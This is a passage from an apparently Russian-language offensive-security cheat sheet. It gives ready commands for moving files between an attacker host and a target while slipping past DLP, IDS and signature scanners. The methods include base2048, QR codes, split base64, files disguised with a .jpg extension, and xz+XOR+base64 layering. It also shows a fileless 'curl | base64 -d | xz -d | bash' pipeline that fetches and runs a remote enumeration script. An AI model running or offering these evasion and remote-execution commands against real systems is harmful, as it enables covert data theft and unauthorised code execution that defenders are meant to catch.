# LHOST
python3 -c "import base2048,sys;sys.stdout.write(base2048.encode(open('file.bin','rb').read()))" > post.txt
# RHOST
python3 -c "import base2048;open('file.bin','wb').write(base2048.decode(open('post.txt',encoding='utf-8').read().strip()))"
```

### Zero-width + cover text (невидимый канал в bio/комментарии)

Текст выглядит безобидно, данные спрятаны невидимыми символами. Готовый скрипт - в разделе [Zero-width / Unicode-стеганография](13-stegano.md#73-unicode-стеганография-zero-width-гомоглифы-emoji).

### QR + base64 + xz (оффлайн-канал: экран -> камера)

Передача без сети: показали QR - считали камерой.

```bash
# LHOST - сжать, закодировать и вывести QR
xz -9 < file.bin | base64 -w0 | qrencode -o qr.png
# RHOST - считать QR и распаковать
zbarimg -q --raw qr.png | base64 -d | xz -d > file.bin
```

### split + base64 + cat (обход лимита длины поля)

Длинную base64-строку закидываем частями в поля с ограничением длины.

```bash
# LHOST - порезать на части
base64 -w0 file.bin | split -b 2000 - part_
# RHOST - собрать обратно
cat part_* | tr -d '\n' | base64 -d > file.bin
```

### Маскировка расширением/MIME

DLP часто фильтрует по расширению - отдаём base64 под безобидным именем.

```bash
# LHOST - отдать как «картинку»
cp file.b64 update.jpg && python3 -m http.server 80
# RHOST
curl -s http://$LHOST/update.jpg | base64 -d > file.bin
```

### xz + XOR + base64 (глубокая матрёшка)

Чем больше слоёв, тем меньше шансов у сигнатурного сканера; снимать - строго в обратном порядке.

```bash
# LHOST: file -> xz -> XOR -> base64
python3 -c "import lzma,base64;open('x.txt','wb').write(base64.b64encode(bytes(b^0x5A for b in lzma.compress(open('file.bin','rb').read(),preset=9))))"
# RHOST: base64 -> XOR -> xz -> file
python3 -c "import lzma,base64;open('file.bin','wb').write(lzma.decompress(bytes(b^0x5A for b in base64.b64decode(open('x.txt','rb').read()))))"
```

### Живой конвейер (выполнение без записи на диск)

Минимум следов на диске, IDS видит один HTTP-запрос.

```bash
curl -s http://$LHOST/linenum.xz.b64 | base64 -d | xz -d | bash
```

---

## Формы переменных

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# использование: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: использование: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# использование: $LHOST
```

Подробнее - [README](../../README_RU.md#обозначения-и-переменные).

---

[← Назад к справочнику](../../README_RU.md)
